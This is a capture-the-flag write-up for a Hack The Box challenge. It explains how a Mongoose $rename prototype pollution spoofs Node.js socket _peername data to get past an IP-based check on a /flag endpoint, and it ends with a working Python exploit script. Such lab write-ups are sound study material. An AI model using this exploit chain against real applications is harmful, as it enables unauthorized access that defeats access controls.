---
name: Secure notes
starting_date: 2026-04-19
modified: 2026-04-19T20:10:50+03:00
private: true
tags:
machine_link: https://app.hackthebox.com/challenges/Secure%2520Notes
difficulty: easy
created: 2026-04-19T20:09:13+03:00
type: CTF
---
## Vulnerability Report: Prototype Pollution to Access Control Bypass

### Executive Summary

The target application is vulnerable to **Prototype Pollution** due to insecure handling of the MongoDB `$rename` operator via the Mongoose ODM (Object Data Modeling) library. By manipulating database documents to include a `__proto__` key and subsequently triggering Mongoose's document hydration process, an attacker can pollute the global `Object.prototype`.

This pollution can be leveraged to manipulate internal Node.js `net.Socket` properties, effectively bypassing the IP-based access control on the `/flag` endpoint.

### 1. The Core Vulnerability: Mongoose Hydration

When Mongoose reads a document from the MongoDB database, it converts the raw BSON data into a JavaScript object (a Mongoose Document). This process is called **hydration**.

Historically, Mongoose has been vulnerable to prototype pollution if a database document contains a `__proto__` key. During hydration, instead of assigning `__proto__` as a standard property, the JavaScript engine interprets it as a setter for the object's prototype, inadvertently modifying the global `Object.prototype`.

### 2. Bypassing Schema Defenses with `$rename`

Mongoose schemas are strict by default. If we attempt to inject `{"__proto__": ...}` directly via the `/create` endpoint, Mongoose filters it out because `__proto__` is not defined in the `Note` schema (`title` and `content` only).

To bypass this, the exploit uses the `/update` endpoint, which accepts arbitrary MongoDB operators. By using the `$rename` operator:

1. We inject the malicious payload into a valid schema field (`content`).
    
2. We issue a `$rename` command to alter the key name directly in the database to `__proto__._peername.address`.
    
3. This alters the raw MongoDB document _behind Mongoose's back_, bypassing the schema validation.
    

### 3. The Shadowing Problem: Why `remoteAddress` Fails

The application secures the `/flag` endpoint using the following check:

JavaScript

```
const remoteAddress = req.connection.remoteAddress;
if (remoteAddress === '127.0.0.1' || ...) { // allow }
```

A standard prototype pollution attack would target `Object.prototype.remoteAddress`. However, in Node.js, `req.connection` is an instance of `net.Socket`. The `remoteAddress` property is not a static string; it is a **getter** defined on `net.Socket.prototype`.

When the application evaluates `req.connection.remoteAddress`, the JavaScript engine stops traversing the prototype chain as soon as it hits the getter on `net.Socket.prototype`. It executes the getter, which returns the actual IP, completely ignoring any polluted value sitting further down the chain on `Object.prototype`. This is known as **property shadowing**.

### 4. The Exploit Mechanism: Bypassing the Getter

To bypass the shadowed property, the exploit targets the internal logic of the getter itself. The native Node.js `remoteAddress` getter retrieves its value from an internal object called `_peername`:

JavaScript

```
// Simplified Node.js internal logic
get remoteAddress() {
  return this._peername ? this._peername.address : undefined;
}
```

The successful exploit chain works as follows:

1. **Pollute the internal property:** We use the `$rename` gadget to pollute `Object.prototype._peername = { address: "::ffff:127.0.0.1" }`.
    
2. **Force a fresh connection:** We drop the HTTP Keep-Alive connection and request the `/flag` endpoint with a brand new socket.
    
3. **Trigger the fallback:** On a new or half-open socket, the `net.Socket` instance may not have its internal `_peername` property initialized immediately.
    
4. **The Bypass:** When the getter executes, `this._peername` is undefined on the instance. The engine traverses the prototype chain, finds our polluted `Object.prototype._peername`, and extracts the spoofed address, granting access to the flag.
    

---

### Exploit Script
```python
import requests
import time

BASE_URL = "http://154.57.164.74:30376"

def exploit():
    # Use a session for the setup
    s = requests.Session()

    print("[*] Creating note...")
    r = s.post(f"{BASE_URL}/create", json={"title": "pwn", "content": "::ffff:127.0.0.1"})
    note_id = r.json().get("_id")

    print("[*] Poisoning via nested $rename...")
    # We do it in one go to ensure the structure is correct
    # This creates { "__proto__": { "_peername": { "address": "::ffff:127.0.0.1" } } }
    r = s.post(f"{BASE_URL}/update", json={
        "noteId": note_id,
        "$rename": {
            "content": "__proto__._peername.address"
        }
    })
    
    # Check if the server returned the polluted object in the response
    print(f"[*] Update response: {r.text}")

    print("[*] Triggering hydration...")
    s.get(f"{BASE_URL}/get/{note_id}")
    
    time.sleep(1)

    print("[*] Requesting flag with a FRESH connection...")
    # DO NOT use the session here. We want a new socket that 
    # will look for _peername on the polluted prototype.
    flag_res = requests.get(f"{BASE_URL}/flag")
    
    print("\n--- RESULT ---")
    print(f"Status Code: {flag_res.status_code}")
    print(f"Response: {flag_res.text}")

if __name__ == "__main__":
    exploit()
```